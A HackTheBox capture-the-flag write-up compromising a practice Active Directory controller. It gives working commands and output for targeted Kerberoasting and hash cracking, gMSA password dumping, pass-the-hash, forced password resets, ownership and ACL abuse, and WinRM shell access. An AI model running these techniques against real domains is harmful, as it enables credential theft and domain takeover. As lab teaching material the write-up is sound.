---
title: "HackTheBox: Tombwatcher Writeup"
date: "2025-10-04"
platform: "HackTheBox"
category: "Active Directory"
difficulty: "Medium"
tags: ["Active Directory", "Kerberoasting", "GMSA", "ADCS", "Windows"]
excerpt: "Complete Active Directory exploitation chain from initial credentials to domain admin through Kerberoasting, GMSA extraction, and ADCS vulnerabilities"
readingTime: 25
featured: true
---

## Initial Credentials

**Username:** henry  
**Password:** H3nry_987TGV!

---

## Reconnaissance: Mapping the Domain Controller

Our journey begins with a comprehensive port scan to understand what services are exposed on our target machine at `10.10.11.72`. We'll use nmap with aggressive timing and a high minimum packet rate to speed up our discovery process.

```bash
nmap -p- -T4 --min-rate 1000 10.10.11.72
```

The scan reveals a typical Windows Domain Controller profile with 22 open ports. The presence of ports like 88 (Kerberos), 389 (LDAP), and 445 (SMB) immediately tells us we're dealing with an Active Directory environment. This is exciting because AD environments offer rich attack surfaces through permission misconfigurations and trust relationships.

**Key Ports Discovered:**

- Port 53 (DNS) - Domain Name Services
- Port 80 (HTTP) - Web server running IIS
- Port 88 (Kerberos) - Authentication protocol
- Port 389/636 (LDAP/LDAPS) - Directory services
- Port 445 (SMB) - File sharing and remote administration
- Port 5985 (WinRM) - Windows Remote Management

---

## Service Enumeration: Understanding Our Target

Now that we know which ports are open, let's probe deeper to understand what versions and configurations are running. This detailed scan helps us identify potential vulnerabilities and understand the domain structure.

```bash
nmap -sV -sC -p53,80,88,135,139,389,445,593,636,3268,3269,5985,9389 10.10.11.72
```

The scan reveals critical information about our target:

**Domain Information:**

- **Domain Name:** tombwatcher.htb
- **Domain Controller:** DC01.tombwatcher.htb
- **Operating System:** Windows Server running IIS 10.0

**Important Observations:**

- SMB signing is enabled and required (this prevents relay attacks)
- There's a significant clock skew of approximately 4 hours (we'll need to address this)
- LDAP is accessible, which means we can query Active Directory

The clock skew is particularly important because Kerberos authentication is time-sensitive. If our system time differs too much from the domain controller, our authentication attempts will fail.

---

## Bloodhound Analysis: Mapping Attack Paths

Bloodhound is like having x-ray vision into Active Directory. It maps relationships, permissions, and potential attack paths by analyzing the domain structure. Let's collect comprehensive data about the domain using our initial credentials.

```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```

This command uses the Python-based Bloodhound collector to gather information about users, groups, computers, trusts, and permissions. The data is packaged into a ZIP file that we can import into the Bloodhound GUI for visual analysis.

**Discovery: The First Attack Path**

After analyzing the Bloodhound data, we discover something interesting: Henry has an outbound relationship that grants write permissions on Service Principal Names (SPNs) for another user. This is the foundation of a targeted Kerberoasting attack.

![Kerberoasting attack](1.png)

---

## Targeted Kerberoasting: Exploiting SPN Write Permissions

Kerberoasting is an attack technique where we request service tickets for accounts with SPNs, then extract and crack the encrypted portions offline. What makes this attack "targeted" is that we can actually set an SPN on a user account we have permissions to modify, then immediately Kerberoast that account.

**Fixing the Clock Skew**

Before we can interact with Kerberos, we need to synchronize our time with the domain controller:

```bash
sudo ntpdate -s 10.10.11.72
```

This ensures our authentication requests won't be rejected due to time discrepancies.

**Executing the Targeted Kerberoast Attack**

```bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

This tool automates the process of:

1. Identifying users we can modify
2. Adding a Service Principal Name to the target account
3. Requesting a Kerberos service ticket
4. Extracting the encrypted portion for offline cracking

**The Captured Ticket:**

```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$a8d06ecacb186e4829bd9da96828a77c$b89dcd9e79e03c68284c9c5b13a4d10258941ee2f7297c58abd7f791f40e1fd076d19f333527999f727d7af210fdb8e10cfd42390af163e4e5567ef2877ac449f841fefbb2a3293d507ad4642b2b9648b34ce9bb224b855a32287b642c2b117629bdf583234ffe65275ea939e8afa35119a81488f0fcb0dd0a1bc5325c9941b65ddd76f5dd1eb32d8ecf2131295e84976af76f433bfc4be8369a738d9e850e621676601f9939b44f865215e673830f874cabbfae20a8ed976341a5f56972dbacc8c34d904f89983348985d5b5524be13deb54066d2d5d2c4b65c393720acceb9c847049a18a77d1c10861d7f3d0a632ded9e83f9a36e381a41f11eaadcf5f30bba0903333eb6e6cd427d5c8ba2bebaf12de3f2f7891549de8bbbd1491ebff207cf3d03dc2ae252260de0fd6a5c3cf62faedd4069ac0c7b3962441aaa9a70063350c19f17341375a56da9e3b6617fabbc5652a3f5582276e2aa54af5850468698ed1981c680fafc2525e8520b92d273cae9ce9af15c18a2019167e7b5017ea6d059415d510196645d1ffc253049792a59506f2f9909c0d3fe08fd8e202250057c023094622ccb0adb4e113f2be8ddcb8632afcf07a734d9227fe1d9c408d7335fab7f0f6c4c0163a412635724b825293cda352d2872ce8fd1c4a2440249f2486ef69bafa864f0ba855bc1c34e774762f854654f44f3c0b35a16b776f8a7d7f96aff7553e98765b4e22ed42930e3b80859be3a92d47b8832f4fdc682b05ff499ca65c9cf9e0efa05c664cbeb8c99f70c1cae5dd019c249fe7fa3719acc428b3772e6c75a4ac9f15b090c59143b569a5e0d10ba6b23a1f7ea4518c006659587950d8a3e7062fdd6401a57e673e5af971209c8ba19adc300269df889380886aeb066cd9859309feec45003f255769f7780e841749f83ce1505e9a4a68d266cf094681588f5cf746c944bc8f163911ecbaeb01c71883a7141c6c90232bae73852a5d7271c7d60ffa84b038d1b4aed1dc1711fd136f360fc2ac7378fcde008a093baa2ac917247bdaa71e6cd8f3e4f96ac83eec0d4f29cd4ae744e189922c65a2fc886946f938ec76fa619d8826c3c25f376373b82bf76455ada3fee2b1d82f332afbe4383433815eecb0b4aa45682a562423bd83214a33e4b6d4f7a2ac6e0e964f4c1ff93642bf4ae68b401d00377e795684f710d83e4badc7776f2927514279ead669210d984b1071c28cb702b392a57616366f73325457b64e77195c97b7bf10e0f2016f98c49198609a6fa04b6bb14791f5fd6e0603e308dc6a32c1aed9e00d89b9e35e6b0d421d12cc706646944b4575ec7ab24cac64f919fd4e29e62ba7f0f239f1b005697b15c01a3b6efd44f82094eb65f3e6b0b994837e241c5613d337c09e6e47747de95b0a0dc6fb8b955c50fdf6800bde22540e03770f9b1a41670659b43e77fc4ae72128c93a67ac5a48d29679320d2aff7
```

This long string contains the encrypted password hash for the Alfred account.

**Cracking the Hash**

We use hashcat with the rockyou wordlist to crack this Kerberos ticket. The mode 13100 specifically handles TGS-REP (Ticket Granting Service Response) hashes.

```bash
hashcat -m 13100 krb_alfred.txt /usr/share/wordlists/rockyou.txt
```

Success! The password is revealed: **basketball**

Alfred clearly has a passion for sports, but a weak password policy.

---

## Escalation to Infrastructure Group

With Alfred's credentials in hand, we return to Bloodhound to analyze what permissions this account has. We discover that Alfred has the `AddSelf` permission on the **Infrastructure** group. This is a powerful permission because it allows us to add Alfred as a member of this group without needing administrative privileges.

**Adding Alfred to Infrastructure Group**

We'll use bloodyAD, a Python-based Active Directory privilege escalation framework:

```bash
bloodyAD -d tombwatcher.htb -u Alfred -p 'basketball' --host 10.10.11.72 add groupMember Infrastructure Alfred
```

**Verification**

Let's confirm that Alfred is now a member of the Infrastructure group:

```bash
net rpc group members "Infrastructure" -U "TOMBWATCHER"/"Alfred"%"basketball" -S "10.10.11.72"
```

![2](2.png)

Perfect! Alfred is now listed as a member of the Infrastructure group. This seemingly simple group membership will unlock powerful new permissions.

---

## GMSA Password Extraction

After updating our Bloodhound data with Alfred's new group membership, we discover something significant: the Infrastructure group has `ReadGMSAPassword` permissions on a service account named **ansible_dev@tombwatcher.htb**.


**What is a GMSA?**

Group Managed Service Accounts (GMSA) are special service accounts in Active Directory where the password is automatically managed by the domain. The password is complex, rotates regularly, and can only be retrieved by authorized principals. However, if we have the `ReadGMSAPassword` permission, we can extract the current password hash.

**Dumping the GMSA Password**

We'll use gMSADumper, a tool specifically designed to extract GMSA credentials:

```bash
python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
```

**Output:**

```
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d
```

We now have the NTLM hash for the ansible_dev service account. We attempted to crack this hash but it proved too complex, which is exactly the point of GMSAs - they use strong, machine-generated passwords.

**Using the Hash for Pass-the-Hash Attacks**

The beauty of having the NTLM hash is that we don't need to crack it. We can use it directly for authentication through pass-the-hash techniques. Let's gather more intelligence by running Bloodhound with these credentials:

```bash
bloodhound-python -u 'ansible_dev$' --hashes ':4f46405647993c7d4e1dc1c25dd6ecf4' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```

---

## The Path to SAM

Analyzing the new Bloodhound data reveals another critical permission: the ansible_dev account has `ForceChangePassword` permissions on **sam@tombwatcher.htb**. This means we can reset SAM's password without knowing the current one.

![3](3.png)

**Forcing a Password Change**

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':4f46405647993c7d4e1dc1c25dd6ecf4' set password SAM 'Abc123456@'
```

![4](4.png)

Success! We've now compromised SAM's account with a password we control.

---

## Lateral Movement to John

Our Bloodhound analysis shows that SAM has interesting permissions over another user named John. The attack chain involves two steps:

1. Take ownership of John's account object
2. Grant ourselves full control permissions
3. Reset John's password

**Taking Ownership**

First, we attempt to set SAM as the owner of John's account object:

```bash
bloodyAD -d 'tombwatcher.htb' -u sam -p 'Abc123456@' --host 10.10.11.72 set owner john sam
```

However, when we try to modify permissions or reset the password, we encounter errors. This happens because simply setting the owner field doesn't always grant immediate control. We need to use a more robust method.

**Using Impacket's owneredit**

```bash
impacket-owneredit -action write -new-owner sam -target john 'tombwatcher.htb'/'sam':'Abc123456@' -dc-ip 10.10.11.72
```

**Output:**

```
[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

Now that ownership is properly established, we can grant ourselves full control over John's account object:

```bash
bloodyAD -d 'tombwatcher.htb' -u sam -p 'Abc123456@' --host 10.10.11.72 add genericAll john sam
```

**Resetting John's Password**

With full control established, resetting the password is straightforward:

```bash
bloodyAD -d 'tombwatcher.htb' -u sam -p 'Abc123456@' --host 10.10.11.72 set password john 'NewP@ssw0rd123!'
```

---

## Gaining Shell Access and User Flag

Now that we control John's account and have WinRM available (port 5985), we can establish an interactive PowerShell session using evil-winrm:

```bash
evil-winrm -u 'john' -p 'NewP@ssw0rd123!' -i 10.10.11.72
```

We're in! Navigating to John's Desktop directory, we find our first flag:

![5](5.png)

**User Flag:** `a01d3d3855b0260046cea6b1d7b8032e`

---

## Privilege Escalation: The Path to Domain Admin

After capturing the user flag, we notice an interesting folder in John's Documents directory related to certificates:

![6](6.png)

This hints at Active Directory Certificate Services (ADCS) being configured in this domain. ADCS can introduce various privilege escalation vectors if misconfigured. We'll use certipy-ad, a powerful tool for enumerating and exploiting ADCS vulnerabilities.

**Discovering the Deleted Account**

Using John's credentials, we query Active Directory for deleted objects that might be relevant:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
```

This reveals a deleted account named **cert_admin** - a highly privileged account that was likely disabled for security but never properly secured.

**Restoring cert_admin**

Active Directory stores deleted objects in a special container for a retention period (typically 180 days). We can restore these objects if we have sufficient permissions:

```powershell
# Restore the deleted account object
Restore-ADObject -Identity <ObjectGUID>

# Enable the account (it's restored in disabled state)
Enable-ADAccount -Identity cert_admin
```

**Setting a New Password**

Now that the account is restored and enabled, we can set a password we control:

```bash
bloodyAD --host '10.10.11.72' -u 'john' -p 'NewP@ssw0rd123!' -d 'tombwatcher.htb' set password cert_admin 'NewPassword123!'
```

**Exploiting ESC15: ADCS Vulnerability**

With the cert_admin account under our control, we can now exploit the ADCS ESC15 vulnerability. This vulnerability relates to misconfigurations in certificate template permissions that allow low-privileged users to obtain certificates as privileged accounts, including Domain Admins.

The exploitation process typically involves:

1. Enumerating vulnerable certificate templates
2. Requesting a certificate as a privileged user
3. Using the certificate to authenticate and obtain privileged access
4. Extracting domain credentials or achieving domain admin access

---

## Conclusion

This box demonstrated a complex attack chain through Active Directory, involving:

- **Targeted Kerberoasting** through SPN write permissions
- **Group membership abuse** via AddSelf permissions
- **GMSA password extraction** using ReadGMSAPassword rights
- **Password reset attacks** through ForceChangePassword permissions
- **Ownership manipulation** for lateral movement
- **Deleted object recovery** for privilege escalation
- **ADCS exploitation** (ESC15) for domain compromise

Each step required understanding AD permissions, trust relationships, and how different privileges chain together to create paths to higher access levels. The key lesson is that Active Directory security is about controlling the accumulation of permissions - any single weak link can become the foundation for complete domain compromise.

---

**Key Takeaways:**

- Always run Bloodhound after gaining new credentials or group memberships
- GMSA accounts are valuable targets for lateral movement
- Deleted objects can contain valuable high-privilege accounts
- ADCS misconfigurations are critical domain-level vulnerabilities
- AD permission chains are often more dangerous than individual permissions